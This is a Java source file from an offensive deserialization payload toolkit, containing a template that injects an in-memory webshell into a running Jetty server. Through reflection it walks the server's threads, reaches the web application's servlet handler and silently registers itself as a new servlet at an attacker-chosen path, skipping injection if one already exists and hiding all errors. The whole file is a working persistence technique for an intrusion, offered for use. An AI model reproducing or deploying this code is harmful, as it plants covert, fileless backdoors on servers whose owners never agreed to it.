package org.su18.ysuserial.payloads.templates.memshell.jetty;

import javax.servlet.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author su18
 */
public class JSMSFromThread implements Servlet {

	public static String pattern;

	public static String NAME;

	static {
		try {
			Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
			threadMethod.setAccessible(true);
			Thread[]    threads           = (Thread[]) threadMethod.invoke(null);
			ClassLoader threadClassLoader = null;

			for (Thread thread : threads) {
				threadClassLoader = thread.getContextClassLoader();
				if (threadClassLoader != null) {
					if (threadClassLoader.toString().contains("WebAppClassLoader")) {
						Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
						fieldContext.setAccessible(true);

						Object webAppContext = fieldContext.get(threadClassLoader);

						Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
						fieldServletHandler.setAccessible(true);
						Object servletHandler = fieldServletHandler.get(webAppContext);

						Field fieldServlets = servletHandler.getClass().getDeclaredField("_servlets");
						fieldServlets.setAccessible(true);
						Object[] servlets = (Object[]) fieldServlets.get(servletHandler);
						boolean  flag     = false;
						for (Object servlet : servlets) {
							Field fieldName = servlet.getClass().getSuperclass().getDeclaredField("_name");
							fieldName.setAccessible(true);
							String name = (String) fieldName.get(servlet);
							if (name.equals(NAME)) {
								flag = true;
								break;
							}
						}

						// 如果没有同名的内存马
						if (!flag) {
							ClassLoader classLoader = servletHandler.getClass().getClassLoader();
							Class       sourceClazz = null;
							Object      holder      = null;
							Field       field       = null;
							try {
								sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
								field = sourceClazz.getDeclaredField("JAVAX_API");
								Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
								holder = method.invoke(servletHandler, field.get(null));
							} catch (ClassNotFoundException e) {
								try {
									sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
								} catch (ClassNotFoundException ignored) {
									sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Holder$Source");
								}
								Method method = servletHandler.getClass().getMethod("newServletHolder", sourceClazz);
								holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
							}

							holder.getClass().getMethod("setName", String.class).invoke(holder, NAME);
							holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, new JSMSFromThread());
							servletHandler.getClass().getMethod("addServlet", holder.getClass()).invoke(servletHandler, holder);
							Class  clazz          = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
							Object servletMapping = null;
							try {
								servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
							} catch (NoSuchMethodException e) {
								servletMapping = clazz.newInstance();
							}

							servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, NAME);
							servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{pattern}});
							servletHandler.getClass().getMethod("addServletMapping", clazz).invoke(servletHandler, servletMapping);
						}
					}
				}
			}
		} catch (Exception ignored) {
		}
	}

	@Override
	public void init(ServletConfig servletConfig) throws ServletException {
	}

	@Override
	public ServletConfig getServletConfig() {
		return null;
	}

	@Override
	public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
	}

	@Override
	public String getServletInfo() {
		return null;
	}

	@Override
	public void destroy() {
	}
}
